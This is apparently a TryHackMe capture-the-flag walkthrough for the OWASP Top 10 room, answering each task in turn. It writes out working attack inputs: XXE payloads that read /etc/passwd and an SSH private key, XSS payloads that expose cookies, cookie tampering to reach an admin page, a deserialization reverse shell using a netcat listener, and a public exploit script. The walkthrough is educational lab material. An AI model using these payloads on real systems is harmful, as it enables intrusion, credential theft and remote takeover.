# OWASP Top 10

![owasp](https://github.com/edoardottt/tryhackme-ctf/blob/main/OWASP-Top-10/owasp.png)


This room breaks each OWASP topic down and includes details on what the vulnerability is, how it occurs and how you can exploit it. You will put the theory into practise by completing supporting challenges.


  - Injection
  - Broken Authentication
  - Sensitive Data Exposure
  - XML External Entity
  - Broken Access Control
  - Security Misconfiguration
  - Cross-site Scripting
  - Insecure Deserialization
  - Components with Known Vulnerabilities
  - Insufficent Logging & Monitoring

The room has been designed for beginners and assume no previous knowledge of security.


- Read the above.

	  no answer needed

- Connect to our network or deploy the AttackBox.

	  no answer needed

- I've understood Injection attacks.

	  no answer needed

- I've understood command injection.

	  no answer needed

- What strange text file is in the website root directory?

	- `ls`
	- `drpepper.txt`

- How many non-root/non-service/non-daemon users are there?

	- `cat /etc/passwd`
	- `0`

- What user is this app running as?

	- `whoami`
	- `www-data`

- What is the user's shell set as?

	- `cat /etc/passwd`
	- `/usr/sbin/nologin`

- What version of Ubuntu is running?

	- `lsb_release -a`
	- `18.04.4`

- Print out the MOTD.  What favorite beverage is shown?

	- `dr pepper`

- I've understood broken authentication mechanisms.

	  no answer needed

- What is the flag that you found in darren's account?

	- Register a user called ` darren` and then login is with that username.
	- `********************************`

- Now try to do the same trick and see if you can login as arthur.

	  no answer needed

- What is the flag that you found in arthur's account?

	- `********************************`

- Read the introduction to Sensitive Data Exposure and deploy the machine.

	  no answer needed

- Read and understand the supporting material on SQLite Databases.

	  no answer needed

- Read the supporting material about cracking hashes.

	  no answer needed

- What is the name of the mentioned directory?

	- `scilla dir -target http://<TARGET_IP>/` ([scilla](https://github.com/edoardottt/scilla))
	- `/assets`

- Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?

	- `webapp.db`

- Use the supporting material to access the sensitive data. What is the password hash of the admin user?

	- `sqlite3 webapp.db`
	- `.tables`
	- `select * from users;`
	- `********************************`

- Crack the hash. What is the admin's plaintext password?

	- `hash-identifier`
	- [MD5](http://www.md5online.it)
	- `**********`

- Login as the admin. What is the flag?

	- `THM{********************************}`

- Deploy the machine attached to the task.

	  no answer needed

- Full form of XML

	- `eXtensible Markup Language`

- Is it compulsory to have XML prolog in XML documents?

	- `no`

- Can we validate XML documents against a schema?

	- `yes`

- How can we specify XML version and encoding in XML document?

	- `XML Prolog`

-  How do you define a new ELEMENT?

	- `!ELEMENT`

- How do you define a ROOT element?

	- `!DOCTYPE`

- How do you define a new ENTITY?

	- `!ENTITY`

- Try the payload mentioned in description on the website.

	  no answer needed

	- Navigate to `http://<TARGET_IP>`
	- Insert this code inside the payload area:

	~~~
	<?xml version="1.0"?>
	<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
	<root>&read;</root>
	~~~
	- Submit

- Try to display your own name using any payload.

	  no answer needed

	- Insert this code inside the payload area:

	~~~
	<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 	<userInfo>
  	<firstName>falcon</firstName>
  	<lastName>&name;</lastName>
 	</userInfo>
	~~~
	- Submit
	
- See if you can read the /etc/passwd

	  no answer needed
	
	- Like we did previously

- What is the name of the user in /etc/passwd

	- `falcon`

- Where is falcon's SSH key located?

	- `/home/falcon/.ssh/id_rsa`

- What are the first 18 characters for falcon's private key

	- Insert this code inside the payload area:

	~~~
	<?xml version="1.0"?>
	<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/idrsa'>]>
	<root>&read;</root>
	~~~

	- `******************`

- Read and understand how broken access control works.

	  no answer needed

- Read and understand how IDOR works.

	  no answer needed

- Deploy the machine and go to `http://<TARGET_IP>` and login with the username being `noot` and the password `test1234`.

	  no answer needed

- Look at other users notes. What is the flag?

	- `?note=0`
	- `flag{*************}`

- Deploy the VM

	  no answer needed

- Hack into the webapp, and find the flag!

	- *disclaimer* Here I found another way to enter. Analyzing the source code of the application, in particular the `login.js` and `cookie.js` I found out that the only Authentication is based on the cookie with name `SessionToken`, so adding that cookie I can enter inside `/mynotes` page. But then, I didn't found anything weird.
	- Googling `Pensive notes source code` you will find a reposiory on GitHub.
	- Reading the README.md: 
	~~~
	After downloading and compiling PensiveNotes, log in using the default credentials pensive:PensiveNotes
	Make sure you change this password immediately!
	~~~
	- Login
	- `thm{********************************}`

- Deploy the VM

	  no answer needed

- Navigate to `http://<TARGET_IP>/` in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".

	- `<script>document.alert('Hello!');</script>`
	- `****************************`

- On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.

	- `<script>document.alert(window.location.hostname);</script>`
	- `Reflecti**********in`

- Now navigate to http://10.10.136.11/ in your browser and click on the "Stored XSS" tab on the navbar; make an account.Then add a comment and see if you can insert some of your own HTML.

	- username: `edoardottt <!--ciao-->`
	- password: whatever
	- Result: `You are currently signed in as <b>edoardottt <!--ciao--></b>.`
	- Uh? NO wait ahaha.
	- Login
	- Click Stored Xss tab.
	- Add a comment. ahah.
	- `*********`

- On the same page, create an alert popup box appear on the page with your document cookies.

	- Found this on the page :)
	~~~
	      function fixJS(comment) {
        if(comment.includes('document.location')) { // stop from redirecting
          return
        }
        if(comment.includes("LVL2")) {
          alert(document.cookie)
        }
        if(comment.includes('<script>alert(')) {
          let tmp = comment.match(/alert(.*?)\)/g);
          tmp = tmp[0]
          tmp = tmp.replace('alert', '').replace('(', '').replace(')', '').replace(/"/g, '')
          alert(tmp)
        } else {
          try {
            let tmp = comment.replace('<script>', '').replace('<\/script>', '')
            eval(tmp)
          } catch(err) {

          }
        }
      }
	~~~
	- I don't know very well actually how I went forward. I did 2-3 tries with `LVL2` and others..(?)
	- `<script>alert(document.cookie)</script>`
	- `**************`

- Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.

	- `<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>`
	- `***********************************`

-  Who developed the Tomcat application?

	- `The Apache Software Foundation`

- What type of attack that crashes services can be performed with insecure deserialization?

	- `Denial of Service`

- Select the correct term of the following statement:
if a dog was sleeping, would this be:

	- `A behaviour`

- What is the name of the base-2 formatting that data is sent across a network as?

	- `binary`

- If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?

	- `webapp.com/login`

- What is the acronym for the web technology that Secure cookies work over?

	- `https`

- 1st flag (cookie value)

	- Create a new user. Choose random username and password.
	- Click then `F12`, you should able to open the Developer console.
	- Click on storage tab.
	- Copy the value of `SessionId` cookie.
	- Go to [CyberChef](https://gchq.github.io/CyberChef/) and decode from base64.
	- `THM{*******************}`

- 2nd flag (admin dashboard)

	- Change the value of the cookie with name `UserType` from `user` to `admin`.
	- Navigate to `http://<TARGET_IP>/admin`.
	- `THM{********************}`

- flag.txt

	- First, change the value of the userType cookie from "admin" to "user" and return to `http://<TARGET_IP>/myprofile`.
	- Then, left-click on the URL in "Exhange your vim".
	- Once you have done this, left-click on the URL in "Provide your feedback!".
	- On your machine `nc -lnvp 4444`
	- Insert your IP inside the file `rce.py`.
	- `python3 rce.py`
	- This will output the encoded payload.
	- Copy and paste this as value of "Encodedpayload" cookie.
	- Make sure that your nc connection is still running.
	- Refresh the page.
	- You should got a reverse shell.
	- `cd ..`
	- `cat flag.txt`
	- `*************`

- Read above.

	  no answer needed

- Read the above!

	  no answer needed

- How many characters are in /etc/passwd (use `wc -c /etc/passwd` to get the answer)

	- I found more than one exploit, anyway I use the most efficient and dangerous.
	- `python3 47887.py <TARGET_IP>`
	- `id`
	- `wc -c /etc/passwd`
	- `****`

- What IP address is the attacker using?

	- `49.99.13.16`

- What kind of attack is being carried out?

	- `brute force`

- Read the above!

	  no answer needed


